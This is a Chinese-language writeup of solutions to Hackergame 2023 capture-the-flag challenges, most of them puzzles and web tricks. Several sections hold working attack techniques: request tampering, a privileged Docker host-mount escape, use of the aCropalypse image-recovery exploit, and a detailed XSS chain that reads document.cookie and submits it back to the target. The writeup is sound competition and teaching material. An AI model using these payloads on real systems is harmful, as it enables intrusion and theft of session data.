# Hackergame 2023 Writeup

by [undefined](github.com/undefined-moe)

## Hackergame 启动

~~这题非常简单。点击开始录制，然后模仿机器音大喊 “Hackergame 启动” 即可获得 flag。（记得控制两词间隔）~~

打开 F12 -> Network，可以看到完成识别后提交了 /?similarity=xx 的请求。将相似度设置为 100 即可获得 flag。

![launch](image.png)

## 猫咪小测

T1：由于会返回最终的分数，所以可以按题使用穷举法。穷举可得第一题答案为 12 。
T2: 搜索“可观测宇宙中的鸡的密度上限”，得到结果 [你见过哪些极品论文？ - 杂然赋流形丶的回答](https://www.zhihu.com/question/20337132/answer/3023506910)，可看到答案为 23 。
T3: 搜索“tcp bbr kernel config” 得到 [CONFIG_TCP_CONG_BBR: BBR TCP - cateee.net Homepage](https://cateee.net/lkddb/web-lkddb/TCP_CONG_BBR.html) 即为答案。
T4: 打开 [中国计算机学会推荐国际学术会议和期刊目录](https://ccf.atom.im/)，翻到 软件工程/系统软件/程序设计语言 分类，穷举即可。

## 更深更暗

F12 得答案。

## 旅行照片

真的不会。

## 赛博井字棋

使用一些小学知识，我们可以推算出井字棋是没有必胜策略的，也就是说，如果双方都不出错的话，最后的结果一定是平局。

分析网络请求，可以发现使用形如 {"x":1,"y":1} 的格式进行传输。那么我们可以尝试手动构造包，来进行一些奇技淫巧。

经过尝试，发现后端对落子位置合法性没有检查，故可通过覆盖对手棋子获胜。

## 奶奶的睡前 flag 故事

非常有意思的一道题目。

![alt](image-1.png)

分析题面，**谷歌的『亲儿子』** (Pixel)，**连系统都没心思升级** (可能是已公布CVE)，**截图**，
搜索 “Pixel CVE Screenshot” 得到 aCropalypse (CVE 2023-21036) 。搜索得到 https://acropalypse.app/ 和 https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02 ，使用首个网站提取失败，后者脚本运行后得到如下图片，可见答案。

![processed](image-2.png)

## 组委会模拟器

```js
setInterval(()=>Array.from(document.getElementsByClassName('fakeqq-message__bubble')).forEach((el)=>{if (/hack\[[a-z]+\]/.test(el.innerHTML)) el.click();}),100)
```

## 虫

搜索 “transmit image with radio waves”，得到 [Wirephoto](https://en.wikipedia.org/wiki/Wirephoto) ，看起来没什么用。  
更换搜索词 “radio transmit image”，得到 [Slow-scan television](https://en.wikipedia.org/wiki/Slow-scan_television)，发现似乎和题目相关，
搜索 “slow scan television decoder”，下载安装 Robot36，播放音频解码图片（真的很吵）。

![decoded](image-3.png)

## JSON \subset YAML?

```json
{"a":1,"a":1e1}
```

双杀。

另：https://stackoverflow.com/questions/77390581/what-is-the-valid-in-json-but-invalid-in-yaml1-2 

Asked 1 hours ago by zephyr Victor (New contributor)

不好意思 没绷住。

## Git? Git

git reflog, git checkout, cat

## HTTP 集邮册

对照 MDN 状态码定义挨个尝试（）

## Docker For Everyone

结合基础的 docker 知识，使用 `docker run --privileged --network=host -v /:/data -it alpine` 。

```text
/ # ls /data
bin         flag        media       root        swap        var
boot        home        mnt         run         sys
dev         lib         opt         sbin        tmp
etc         lost+found  proc        srv         usr
/ # cat /data/flag
cat: can't open '/data/flag': No such file or directory
```

...欸？

```text
/ # ls -al /data/flag
lrwxrwxrwx    1 root     root            13 Oct  8 12:10 /data/flag -> /dev/shm/flag
/ # cat /data/dev/shm/flag
flag{u5e_r00t1ess_conta1ner_2cc3eee727_plz!}
```

满意退场。

## 惜字如金 2.0

分析题目可得 payload 中每行丢失了一个字。
根据常识，答案前五字节必为 `flag{`, 尝试对齐即可。

## 高频率星球

先拼接所有有效输入；

```js
const fs = require('fs');
const data = fs.readFileSync('./a.rec', 'utf-8');
let code = '';
for (const line of data.split('\n')) {
    if (!line.trim()) continue;
    const d = JSON.parse(line);
    if (d instanceof Array) {
        const payload = d[2];
        code += payload;
    }
}
fs.writeFileSync('./t.js', code);
```

之后删除文件收尾不属于代码文件的部分；
此时发现文件中仍有大量转义符，分析文件，使用正则查找替换功能，将 `:[^\n]+\[K\n[^\n]+\n[^\n]+\[K` 替换为空串。手动处理最后一串比较特别的位置，之后使用 node 运行得到 flag。

## 流式星球

```python
import cv2
import numpy as np
import random

def create_video(file, output):
    vidcap = cv2.VideoCapture(file)
    frame_count = int(vidcap.get(cv2.CAP_PROP_FRAME_COUNT))
    frame_width = int(vidcap.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(vidcap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    assert frame_width % 10 != 0
    assert frame_height % 10 != 0
    buffer = np.empty(shape=(frame_count, frame_height, frame_width, 3), dtype=np.uint8)
    for i in range(frame_count):
        success, frame = vidcap.read()
        if not success:
            raise Exception(f"Failed to read frame {i}")
        buffer[i] = frame
    buffer = buffer.reshape((frame_count * frame_height * frame_width, 3))
    buffer = buffer.ravel()
    buffer = buffer[:-random.randint(0, 100)]
    buffer.tofile(output)

if __name__ == "__main__":
    with open("video.bin", "wb") as output:
        create_video("video.mp4", output)
```

可以看到视频被拍扁之后删除了末尾的一部分字节。要还原出原始视频，就需要知道视频的宽高。
考虑到视频切裁去的字节数较少，使用暴力枚举：

```python
import cv2
import numpy as np

def is_valid_buffer(buffer): # 在能够正常观看的视频中，像素不应当有特别大的闪烁，因此取每两帧的差求平均值，筛选出可能的视频
    res = np.zeros(buffer.shape[0] - 1)
    for i in range(buffer.shape[0] - 1):
        res[i] = np.average(buffer[i] - buffer[i+1])
    print(np.average(res), np.std(res))
    return np.average(res) < 100

def writeVideo(buffer, name):
    video = cv2.VideoWriter(name, cv2.VideoWriter_fourcc(*'mp4v'), 30, (buffer.shape[2], buffer.shape[1]))
    for i in range(buffer.shape[0]):
        video.write(buffer[i])
    video.release()

def decrypt(file, output):
    buffer = np.fromfile(file, dtype=np.uint8)
    datalen = buffer.shape[0]
    for i in range(0, 100):
        totlen = datalen + i
        if totlen % 3 == 0: # 一个像素三个字节，所以总字节数必须是 3 的倍数
            total_pixels = totlen // 3
            for w in range(20, 1000): # 合理的宽高范围
                for h in range(20, 1000):
                    if (total_pixels%(w*h)==0 and (total_pixels//(w*h)<900)):
                        newBuf = buffer.copy()
                        newBuf.resize((totlen))
                        newBuf = newBuf.reshape((total_pixels//(w*h), w, h, 3))
                        if (is_valid_buffer(newBuf)):
                            print('valid', total_pixels//(w*h), w, h)
                            writeVideo(newBuf, str(w)+"x"+str(h)+output)

decrypt("video.bin", "video.mp4")
```

## Komm, süsser Flagge

将请求拆成两次发就可以绕过，并同时通过 1, 2 小问（可能是非预期）

## 为什么要打开 /flag 😡

### LD_PRELOAD, love!

分析题目，第一小问使用 LD_PRELOAD 加载 dll 覆盖了部分 glibc 函数。
既然 glibc 有问题，那么我们就绕过 glibc 吧。
那...应该怎么做呢？

手搓 asm！

```asm
.text
.global open
open:
    mov rax, 2
    mov rdi, rdi
    mov rsi, rsi
    mov rdx, rdx
    syscall
    ret
```

不好意思，学习了半小时 asm 还是不会读取文件输出，以上代码片段使用 Copilot 生成，大家图一乐就好。

突然想到，好像有一种语言不用 glibc 啊？那个玩意好像叫 Golang？

```go
package main

import (
  "io/ioutil"
  "fmt"
)

func main() {
  payload, err := ioutil.ReadFile("/flag")
  if err != nil {
    panic(err)
  }

  fmt.Printf("%s\n", string(payload))
}
```

啊哈，这样就可以了。

## 异星歧途

本题的难点在于认识到逻辑是由游戏中的处理器方块控制的。

## 微积分计算小练习 2.0

F12 即可发现 xss 点。但是本题条件非常苛刻：

- 不能使用 \` ( ) 意味着没有办法进行任何形式函数调用；（其实是有的 但是会很长）
- 25b 的输入限制（约三个单词）

为了极致节省字符，使用 `"[expr]+"` 模板进行注入，此时我们能够输入 20b 的 payload。

但是...20b能做什么？

显然最终目标是拿到 `document.cookie`，啊 不能用 `.`，那就是 `document["cookie"]`，共 18b 。用 7b 把它发出去肯定是不可能的，一定需要从其他地方传入更多的指令。  
根据题目提示，popup可以使用，尝试通过 `postMessage()` 进行通讯？

但是 onmessage 参数是 Event 欸，没有办法塞进 eval 才对。如果要提取 arg.data，需要手写 callback，但是显然没有 `>()` 的情况下不可能定义任何函数。

那么...还有什么能传入数据呢？地址栏！`"+location+"` ，这不就成了吗？  
访问 `/result?<script>alert(1)</script>` 欸，很不幸，尖括号被转义了。咋办捏？解码？`decodeURIComponent` 也要 18b 啊。用那个 `unescape` ？那怎么调用函数呢？好像没法。

观测到群友在尝试 `\74script\76data` ，有什么用呢？
`\74script\76onmessage=d=\62eval\40d["data"]\41` 也太长了。
`\74script\76"+location+"` 也不行，因为地址前面的东西丢进 script 要爆炸的。`\74script\76/*"+location+"` ！只需要在地址里面加上 `*/` 就可以开始写了。等等...这个 payload 有 26b。草！血压高了（虽然后面发现这个位置的 script 似乎插入进去也不会执行）

再想想，我真的需要 `<script>` 吗？然后就查找到了 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet ,
想到 `"+location+"`，既然输入不了 `<>`，那直接内置在 xss payload 中不就可以了？于是就有了 `\74"+location+"\76` 。

那么我们现在就有了一个可以用的标签。啊 不对，地址一定是 http 开头的，看着就不太行，改一下：`\74input "+location+"\76` 。
访问 `/result?/autofocus/onfocusin=alert(1)` 确认能用。着手构造 payload。既然比赛环境不联网，提交的注释又会回显，直接提交回来就可以了。

```js
fetch('/result',{method:'POST',body:'comment='+btoa(document.cookie).substr(0,20),headers:{'Content-Type':'application/x-www-form-urlencoded'}})
```

(防止有特殊字符，b64编码一下，然后截断多次返回防止超长)
然后发现这段代码有些字符也自动被 urlencode 了（

好办，也 b64 一下，变成 `eval(atob('xxx'))`，本地测试通过。
提交到平台上，好像不对捏？怎么没反应。

研究良久，发现了 https://github.com/puppeteer/puppeteer/issues/1462 ，茅厕顿开。既然 focus 不能用，那就换一个呗。于是就有了 `\74img "+location+"\76` 配合 `/result?src/onerror=` 的方案。

将 payload 提交，网页中使用 

```html
<script>
window.open('http://web/result?/src/onerror=eval(atob(`{payload}`))');
</script>
```

分批 dump cookie，b64 解码后得到 `flag=flag%7Bx55_still_alive%26%3D%3E_%3C+_4269396f90%7D`。
一眼 uriencode。解码后是 `flag{x55_still_alive&=>_<+_4269396f90}`，提交，答案错误，重新复制，提交，答案错误，？？

公告：题目「微积分计算小练习 2.0」的题目描述添加了补充说明 1。
> 补充说明 1：根据题目附件所提供源码，cookie 中的 flag 被 Python 的 urllib.parse.quote_plus 函数变换过。取决于解题方式，选手最终得到的 flag 可能还会被其他方法进一步编码，请注意正确解码。

urllib.parse.quote_plus(string, safe='', encoding=None, errors=None)  
 Like quote(), **but also replace spaces with plus signs**

好好好，这么玩。把加号换回空格。提交，结束。（主办方一定是故意的）
